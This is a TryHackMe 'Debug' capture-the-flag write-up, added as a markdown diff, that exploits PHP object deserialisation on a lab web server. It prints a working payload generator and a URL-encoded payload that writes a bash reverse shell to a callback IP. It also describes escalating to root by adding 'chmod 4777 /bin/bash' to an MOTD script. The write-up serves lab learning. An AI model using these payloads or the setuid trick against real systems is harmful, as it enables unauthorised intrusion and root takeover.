@@ -1,0 +1,195 @@
+# Debug
+
+---
+
+Platform: Tryhackme
+
+Difficulty: Medium
+
+Initial Access: PHP deserialisation vulnerability
+
+Privilege Escalation: Misconfigured File permissions
+
+---
+
+Nmap Scan:
+
+```bash
+┌──(ghost㉿kali)-[~/tryhackme/debug]
+└─$ cat nmap.full 
+# Nmap 7.95 scan initiated Wed Aug 13 01:00:03 2025 as: /usr/lib/nmap/nmap -Pn -A -p- --min-rate 4000 -oN nmap.full 10.201.23.26
+Nmap scan report for 10.201.23.26
+Host is up (0.24s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
+|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
+|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=8/13%OT=22%CT=1%CU=42752%PV=Y%DS=5%DC=T%G=Y%TM=689C1C1
+OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SEQ
+OS:(SP=104%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%
+OS:CI=I%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SEQ(SP=F9%GC
+OS:D=1%ISR=10D%TI=Z%CI=RD%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT
+OS:11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=6
+OS:8DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q
+OS:=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%
+OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
+OS:)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=
+OS:S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
+OS:CK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 5 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+| Ports | Methodology |
+| --- | --- |
+| 22 (SSH) | Potentially for later use. |
+| 80 (HTTP) | Apache httpd 2.4.18 version running on ubuntu. Have to look at what exactly is running there. |
+
+Port 80:
+
+Default Apache web page: It works!, nothing interesting even in source code.
+
+![image.png](image.png)
+
+And there was some static website hosted on `/index.php` endpoint.
+
+![image.png](image%201.png)
+
+Directory Fuzzing:
+
+![image.png](image%202.png)
+
+Direcoty fuzzing revealed an interesting endpoints to look - `/backup`  
+
+![image.png](image%203.png)
+
+From all those files, one file `index.php.bak` is of our interest, which potentially holds backend code used for that `index.php` endpoint.
+
+Downloading that file and reviewing it’s code revealed a juicy detail or maybe potential vulnerablility in that code, basically vulnerable to php deserialisation.
+
+![image.png](image%204.png)
+
+What that code is doing?
+
+- **Class Definition**
+    - `FormSubmit` stores form data (`name`, `email`, `comments`) into a text file (`message.txt`).
+    - `$form_file` is the file name.
+    - `$message` stores the constructed message string.
+- **SaveMessage() method**
+    - Pulls values from `$_GET` without sanitization.
+    - Builds `$this->message` with the form values.
+- **__destruct() method**
+    - Runs **automatically when the object is destroyed** (end of script).
+    - Appends the `$message` to `message.txt` in the current directory.
+    - Prints a success message.
+- **Main execution**
+    - `$debug = $_GET['debug'] ?? '';`
+    - `$messageDebug = unserialize($debug);` ← **big problem**
+    - Creates a new `FormSubmit` object.
+    - Calls `SaveMessage()`.
+
+Methodology:
+
+- `unserialize()` on **unsanitized user input** (`$_GET['debug']`) lets an attacker create a serialized PHP object of any class — including `FormSubmit`.
+- If an attacker injects a serialized `FormSubmit` object with a malicious `$form_file` (e.g., `/var/www/html/shell.php`) and `$message` containing PHP code, the destructor will **write** to that file, resulting in **Remote Code Execution (RCE)**.
+
+---
+
+### Initial Access
+
+Following the above methodology, created a php serialised code containing for creating the payload, which contains reverse shell.
+
+```bash
+┌──(ghost㉿kali)-[~/tryhackme/debug]
+└─$ cat test.php     
+<?php
+class FormSubmit {
+    public $form_file = 'shell.php';
+    public $message = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.17.87.131/4445 0>&1\'");';
+}
+echo urlencode(serialize(new FormSubmit));
+?>
+```
+
+This script will 
+
+- create a new class named `FormSubmit`
+- `$form_file` variable set to `shell.php` , meaning if this object is unserialized by vulnerable code, and later the object’s destructor writes to `$form_file`, it will write to a file named `shell.php` .
+- `$message` variable contains malicious PHP code that executes a reverse shell.
+- `serialize(new FormSubmit)` : Makes an object with those malicious property values.
+- `urlencode()` encodes for flawless URL delivery.
+
+Generated final payload via this php code.
+
+![image.png](image%205.png)
+
+At this point, just started netcat listner and delivered that payload to the `debug` parameter like these:
+
+```bash
+http://10.201.44.136/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A71%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.17.87.131%2F4445+0%3E%261%27%22%29%3B%22%3B%7D
+```
+
+```bash
+http://10.201.44.136/shell.php
+```
+
+And went to `/shell.php` endpoint to trigger that reverse shell and got the shell back on my machine.
+
+![image.png](image%206.png)
+
+And here in that same directory, where we landed, there was a file `.htpasswd` which revealed james user’s password hash.
+
+![image.png](image%207.png)
+
+Cracked that hash via john the ripper
+
+![image.png](image%208.png)
+
+With the following credentials switched to user james in that same shell
+
+![image.png](image%209.png)
+
+Grabbed user flag in the james’s home directory:
+
+![image.png](image%2010.png)
+
+---
+
+### Privilege Escalation
+
+There was suspicious note file which revealed something juicy hint for us.
+
+![image.png](image%2011.png)
+
+Found out files from /etc directory, on which user james had write access to.
+
+![image.png](image%2012.png)
+
+Changed directory to `/etc/update-motd.d` where user james had write access and enumerating those files, found `00-header` file where we can easily add our commands too.
+
+![image.png](image%2013.png)
+
+Simply added `chmod 4777 /bin/bash` command in that file, which will set SETUID bit on /bin/bash binary, when we log in as user james via ssh.
+
+![image.png](image%2014.png)
+
+Logged in to user james account via SSH
+
+![image.png](image%2015.png)
+
+Executed /bin/bash binary and got euid set to root and now, we are able to read root.txt file.
+
+![image.png](image%2016.png)
+
+---
+
+That’s it for this machine.✅
